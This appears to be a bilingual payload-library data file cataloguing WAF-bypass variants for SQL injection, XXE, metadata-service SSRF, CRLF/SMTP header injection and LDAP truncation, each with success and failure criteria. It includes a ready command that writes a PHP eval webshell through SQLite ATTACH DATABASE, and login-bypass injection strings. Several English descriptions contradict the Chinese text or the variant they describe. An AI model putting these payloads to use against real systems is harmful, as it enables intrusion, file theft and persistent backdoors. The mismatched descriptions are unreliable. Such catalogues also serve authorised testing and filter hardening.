title.zh: 盲态存在性十六进制路径

description.zh: 路径十六进制绕过引号与路径检测。判据：返回 passwd 内容。重写为盲态存在性变形：0x2F6574632F706173737764 即 /etc/passwd 的十六进制，LOAD_FILE 返回非空且 SLEEP(3) 延迟出现即证明文件可读，与 WB#0 的 UNION 回显通道构成盲/回显双通道矩阵；失效条件：SLEEP 被过滤或 FILE 权限不足。
description.en: Hex path evades quote/path rules. Success: passwd returned. Rewritten as a blind existence form: the hex literal decodes to /etc/passwd, and a 3-second delay firing only when LOAD_FILE returns non-null proves the file is readable, forming a blind/echo pair with the UNION echo channel; it fails when SLEEP is filtered or FILE privilege is missing.

explanation.zh: 十六进制路径读取，等价 /etc/passwd
存在性差分：文件可读才延迟
explanation.en: Existence differential: delays only when readable

title.zh: 十进制整数 IP 变体

description.zh: 十进制整数 IP 变体 — 元数据地址以十进制整数 2852039166（等价 169.254.169.254）书写，规避 169.254 明文黑名单，依赖解析器地址解析接受整数形式；成功判据：解析器仍请求元数据服务。本变形命令已落地十进制整数主机 2852039166，载荷不含任何实体编码；失效条件：仅解析器地址解析接受整数形式时成立——libxml2/Java Xerces 通常接受 inet_aton 形态，.NET 拒绝。
description.en: Encodes the link-local address as numeric entities to evade the 169.254 plaintext blacklist. Success: the metadata service is still requested after parsing. The rewrite lands the decimal integer host 2852039166 directly in the payload with no entity encoding involved. Fails unless the resolver accepts integer host forms: libxml2 and Java Xerces normally accept inet_aton notation, while .NET rejects it.

explanation.zh: 十进制整数形式的 IMDS 地址，等价 169.254.169.254
explanation.en: IMDS address written as a decimal integer, equivalent to 169.254.169.254

explanation.zh: 实体引用触发解析器发请求
explanation.en: Entity reference makes the parser fetch the URL

title.zh: 通用实体直连变体

description.zh: 通用实体直连变体 — 改用通用实体在正文中直接引用远端 DTD 地址，载荷不出现参数实体与 % 引用特征，规避针对参数实体外链的规则；成功判据：{LAB_OAST} 收到 xxe.dtd 请求。本变形命令已落地通用实体形态：内部子集声明通用实体 xxe，正文以 &xxe; 直接引用，与 EXEC#0 的参数实体 %xxe; 形态不再重复；失效条件：解析器禁止外部通用实体（多数现代默认配置）时 &xxe; 不展开、请求不发出，此时与参数实体形态的差分即失效。
description.en: Writes the leading h as a numeric entity that resolves at parse time. Success: OAST receives the request. The rewrite lands the general-entity form: an external general entity declared in the internal subset and referenced directly as &xxe; in the body, so the payload no longer duplicates the parameter-entity %xxe; shape of the execution baseline. Fails when external general entities are disabled, which most modern default configurations do, since &xxe; then never expands and no request is sent.

explanation.zh: 通用实体声明，无 % 参数实体特征
explanation.en: General entity declaration without a parameter-entity signature

explanation.zh: 正文直接引用触发外部拉取
explanation.en: Direct body reference triggers the external fetch

description.zh: URL scheme 大小写不敏感，HTTP:// 规避小写 http:// 匹配；成功判据：外部 DTD 仍被加载。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。
description.en: Scheme is case-insensitive so HTTP:// evades lowercase http:// matching. Success: the external DTD still loads. Fails against modern WAFs: request normalization makes case confusion broadly ineffective, so only case-sensitive self-built regex rules still fall for it.

title.zh: 正则边界新形态变体

description.zh: 复测三条正则绕过域；放行结果与正样例一致即确认该绕过在边界同样成立。本变形补两条正则边界新形态替代原复测内容：端口+尾点组合（https://{TARGET}.{ATTACKER_HOST}:443.）检验正则是否锚定主机段结尾；点号百分号编码（https://{TARGET}%2E{ATTACKER_HOST}）需应用层解码后才参与比对；对应行被放行即证明对应边界缺口。
description.en: Replay the three regex-bypass domains; the same allowance as the positive samples confirms the bypass holds at the boundary. The rewrite replaces the replay with two real regex-boundary forms: a port plus trailing dot combination testing whether the rule anchors the host segment end, and a percent-encoded dot that only joins the hostname after an application-layer decode; an allowed line proves the matching boundary gap.

explanation.zh: 端口加尾点，检验正则结尾锚定
explanation.en: Port with trailing dot probes end anchoring

explanation.zh: 点号编码，需应用层解码后比对
explanation.en: Encoded dot joining the host only after an app-layer decode

title.zh: PUBLIC 外部子集变体

description.zh: PUBLIC 外部子集变体 — 改用 DOCTYPE 的 PUBLIC 形式引用外部子集，载荷不出现 SYSTEM "http 与参数实体特征；成功判据：{LAB_OAST} 收到 x.dtd 请求。本变形命令已落地 PUBLIC 形式，替换原先与标题不符的参数实体命令；失效条件：PUBLIC 形式触发外部子集拉取依赖解析器开启外部 DTD 加载，禁用外部 DTD 的解析器不会发起请求。
description.en: Encodes the first scheme character as a hex character reference to hide the http:// literal. Success: the external DTD request reaches OAST. The rewrite lands the PUBLIC form, replacing the earlier parameter-entity command that did not match the title. Fails when the parser disables external DTD loading: the PUBLIC form only triggers the external subset fetch on parsers that allow it.

explanation.zh: PUBLIC 形式外链，无 SYSTEM 关键字
explanation.en: PUBLIC form external link without the SYSTEM keyword

description.zh: 绕过区分大小写的特征匹配：保留语义仅变形大小写；报错仍回显版本即成功。失效条件：仅对区分大小写的自研正则/旧版规则有效；ModSecurity v3/CRS、Cloudflare、AWS WAF、雷池在 SQLi 检测前均做大小写归一化，现代环境判 C。
description.en: Preserve semantics while only mutating case against case-sensitive matching; the error still echoing the version confirms success. Only works against case-sensitive self-built regex or legacy rules; ModSecurity v3/CRS, Cloudflare, AWS WAF, and SafeLine all normalize case before SQLi detection, so modern environments rate this C.

patches.expectedCommand: aTTach dATabase '{WEB_ROOT}/{SHELL_NAME}' as lol;creAte tAble lol.pwn(dataz text);insErt inTo lol.pwn values('<?php @eval($_POST[c]);?>');detAch lol;

description.zh: 绕过区分大小写的 ATTACH DATABASE 规则：仅变形大小写保持语义；文件成功落地即成功。失效条件：仅对区分大小写的自研正则/旧版规则有效；ModSecurity v3/CRS、Cloudflare、AWS WAF、雷池在 SQLi 检测前均做大小写归一化，现代环境判 C。
description.en: Mutate only case while preserving semantics against case-sensitive ATTACH rules; the file landing successfully confirms success. Only works against case-sensitive self-built regex or legacy rules; ModSecurity v3/CRS, Cloudflare, AWS WAF, and SafeLine all normalize case before SQLi detection, so modern environments rate this C.

description.zh: 绕过登录表单的明文特征过滤：载荷百分号编码并混合大小写；认证通过或用户面板跳转即成功。失效条件：WAF 标准解码会先还原一层百分号编码，编码行随即失效；剩余大小写维度仅对区分大小写的自研正则/旧版规则有效，ModSecurity v3/CRS、Cloudflare、AWS WAF、雷池在 SQLi 检测前均做大小写归一化，现代环境判 C。
description.en: Percent-encode and case-mix the payload against plaintext login-form filters; a passed authentication or user-panel redirect confirms success. Standard WAF decoding restores the percent-encoding first and the encoded lines die immediately; the remaining case dimension only works against case-sensitive self-built regex or legacy rules, and ModSecurity v3/CRS, Cloudflare, AWS WAF, and SafeLine normalize case before SQLi detection, rated C in modern environments.

description.zh: 绕过按 type/content 小写键取值的检测逻辑：键名大小写变形测试后端匹配宽松度；消息仍被处理且注入生效即成功。失效条件：仅对按大小写不敏感方式读取 JSON 键的实现成立，严格键名匹配的后端会直接忽略变形键；现代检测在归一化后与基线等价，判 C。
description.en: Mutate key case to test lenient backend matching of type/content keys; the message still handled with an effective injection confirms success. Only works where the backend reads JSON keys case-insensitively; strict key matching ignores the mutated keys outright, and modern detection is baseline-equivalent after normalization, rated C.

description.zh: 以大小写混合提交相同 UNION 语句；查询仍执行并返回与基线一致的结果即确认大小写过滤被绕过。失效条件：仅对区分大小写的自研正则/旧版规则有效；ModSecurity v3/CRS、Cloudflare、AWS WAF、雷池在 SQLi 检测前均做大小写归一化，现代环境判 C。
description.en: Resubmit the same UNION with mixed case; the query still executes and returns baseline-consistent results, confirming case filtering is bypassed. Only works against case-sensitive self-built regex or legacy rules; ModSecurity v3/CRS, Cloudflare, AWS WAF, and SafeLine all normalize case before SQLi detection, so modern environments rate this C.

description.zh: 用 MySQL 版本注释 /*!*/ 包裹关键字提交；第一条语句回显 database() 值、第二条返回与基线一致的占位结果，即确认版本注释绕过有效。失效条件：仅对不规范化 MySQL 注释的正则规则有效；ModSecurity v3/CRS 等现代 WAF 会剥离或规范化注释后再匹配，现代环境判 C。
description.en: Wrap keywords in MySQL version comments; the statement still executes and returns database(), confirming the version-comment bypass works. Only works against regex rules that skip MySQL comment normalization; modern WAFs such as ModSecurity v3/CRS strip or normalize comments before matching, rated C in modern environments.

description.zh: 以注释分词与空字节变体提交 UNION；语句仍执行并返回相同结果即确认注释/空字节绕过有效。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。本条 UN%00ION 形态另需 2000s 时代 IIS+ASP 对 %00 截断处理不当才成立，现代 IIS/网关已正确处理。
description.en: Resubmit UNION with comment tokenization and null-byte variants; the statement still executes with identical results, confirming the comment/null-byte bypass. Fails on modern stacks: only PHP below 5.3.4 or custom C-level truncation honors the null byte, and modern parsers are fixed. The UN%00ION form additionally needs the flawed null-byte truncation of IIS with ASP from the 2000s era; modern IIS and gateways handle it correctly.

description.zh: 绕过对过滤器尾部拼接的校验：注入后补空字节截断残余语法；查询返回注入目标即成功。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。本条 LDAP 过滤器形态另依赖老旧 C 实现的 NUL 截断语义；OpenLDAP、JNDI、AD 等现代库对 NUL 要么拒绝要么按字面处理。
description.en: Truncate residual filter syntax with an injected null byte; the query returning the injected target confirms success. Fails on modern stacks: only PHP below 5.3.4 or custom C-level truncation honors the null byte, and modern parsers are fixed. The LDAP filter form additionally relies on NUL truncation semantics of legacy C implementations; modern libraries such as OpenLDAP, JNDI, and AD either reject NUL or treat it literally.

description.zh: 绕过只解码一次的输入过滤：闭合引号与注释二次编码；二阶查询报错即成功。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Double-encode the closing quote and comment past single-decode filters; an error in the second-order query confirms success. Only holds where the stack performs a second URL decode.

patches.expectedCommand:
admin＇ OR ＇1＇=＇1
test@test.com' UNION SELECT password FROM users WHERE '1'='1
\x27 OR 1=1--

description.zh: 分别用全角引号（＇）、UNION 变体与 \x27 十六进制转义构造条件，验证依赖字符形态的过滤是否被绕过。失效条件：MySQL 不把 U+FF07 当引号，仅应用做全半角归一化或 GBK 转码时成立；\x27 也非 SQL 层转义，需应用层 stripcslashes 类处理，现代环境判 C。
description.en: Builds conditions with fullwidth quotes, a UNION variant, and the \x27 hex escape to test filters that depend on character form. MySQL never treats U+FF07 as a quote, so this needs full-to-half-width normalization or GBK conversion in the application; the \x27 form additionally needs an app-side stripcslashes-style pass, rated C in modern environments.

description.zh: 绕过 WordPress 侧只解码一次的过滤：空格与@二次编码；错误日志或响应差异出现即成功。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Double-encode spaces and @ against single-decode filtering in the WordPress layer; an error log entry or response delta confirms success. Only holds where the stack performs a second URL decode.

description.zh: 换行双重编码规避一次解码后的 CRLF 检测；成功判据：注入命令序列被执行。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Double-encodes newlines to survive single-decode CRLF inspection. Success: the injected command sequence executes. Only holds where the stack performs a second URL decode.

description.zh: 绕过一次解码后拦截换行的过滤器。成功判据：邮件产生额外密送收件人。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Bypasses newline filters applied after one decode. Success: the mail gains an extra Bcc recipient. Only holds where the stack performs a second URL decode.

description.zh: 第二层解码发生在邮件库组装头时。成功判据：邮件主题被替换或追加。失效条件：仅对做二次 URL 解码的架构成立。
description.en: The second decode happens when the mail library assembles headers. Success: the mail subject is replaced or appended. Only holds where the stack performs a second URL decode.

description.zh: 编码与双重编码换行在 SMTP 会话层还原。成功判据：会话执行注入命令。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Encoded and double-encoded newlines resolve at the SMTP session layer. Success: the session executes injected commands. Only holds where the stack performs a second URL decode.

description.zh: 双重编码分隔符在第二层解码时重新拆分。成功判据：后端取到双参数。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Double-encoded separators re-split at the second decode layer. Success: the backend receives both parameters. Only holds where the stack performs a second URL decode.

description.zh: 双重编码的过滤值在二次解析层还原。成功判据：还原后过滤命中 admin。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Double-encoded filter values resolve at the second parse layer. Success: the resolved filter matches admin. Only holds where the stack performs a second URL decode.

description.zh: 绕过不识别 %u 系列编码的 WAF（IIS 场景）：用 %u0027 表示引号；数据库报错或条件差异出现即成功。失效条件：IIS 7+ 直接拒绝 %u 编码（返回 400），仅 IIS 6/5 存活，现代环境判 C。
description.en: Use %u-style encoding for the quote on IIS targets whose WAF misses this form; a database error or conditional difference confirms success. Fails on IIS 7 and later, which reject percent-u encoding outright with a 400; only IIS 6/5 era stacks accept it, rated C in modern environments.

description.zh: 绕过对标准引号字符集的封锁：用 U+02BC 修饰字母撇号参与规范化还原；谓词生效引发差异即成功。失效条件：无任何主流标准化层把 U+02BC 映射为撇号，仅在自研 normalize 映射表存在的应用成立，现代环境判 C。
description.en: Use the U+02BC modifier apostrophe to survive quote charset bans via normalization; an effective predicate causing a delta confirms success. No mainstream normalization layer maps U+02BC to an apostrophe, so this only works in applications shipping a custom normalize table, rated C in modern environments.

description.zh: 绕过对全角串整体匹配的规则：半角全角混排使特征不完整；登录或查询行为异常即成功。失效条件：MySQL 不把 U+FF07 当引号，仅应用做全半角归一化或 GBK 转码时成立，现代环境判 C。
description.en: Mix halfwidth and fullwidth so signatures never fully match; anomalous login or query behavior confirms success. MySQL never treats U+FF07 as a quote, so this needs full-to-half-width normalization or GBK conversion in the application, rated C in modern environments.

description.zh: 绕过剥离标准注释后重组语句的 WAF：利用 MySQL 版本注释让内容在执行期还原；marker 回显即成功。失效条件：仅对不规范化 MySQL 注释的正则规则有效；ModSecurity v3/CRS 等现代 WAF 会剥离或规范化注释后再匹配，现代环境判 C。
description.en: Abuse MySQL versioned comments so the payload is restored at execution time after comment stripping; an echoed marker confirms success. Only works against regex rules that skip MySQL comment normalization; modern WAFs such as ModSecurity v3/CRS strip or normalize comments before matching, rated C in modern environments.

description.zh: 绕过按空格分词识别 LIMIT 的规则：子句值括号化紧排；行集按预期截断即成功。失效条件：LIMIT(1) 括号形式仅 PostgreSQL/部分支持 LIMIT 表达式的方言合法，MySQL 对 LIMIT (1) 直接语法错误；MySQL 目标改用 LIMIT 0,1 注释分词形态（WB#1 已覆盖）。
description.en: Parenthesize clause values with no spaces against space-tokenized LIMIT detection; the rowset truncating as expected confirms success. The parenthesized LIMIT form is only valid on PostgreSQL and dialects accepting LIMIT expressions; MySQL rejects LIMIT (1) as a syntax error, so use the comment-tokenized LIMIT 0,1 form there, already covered by another variant in this set.
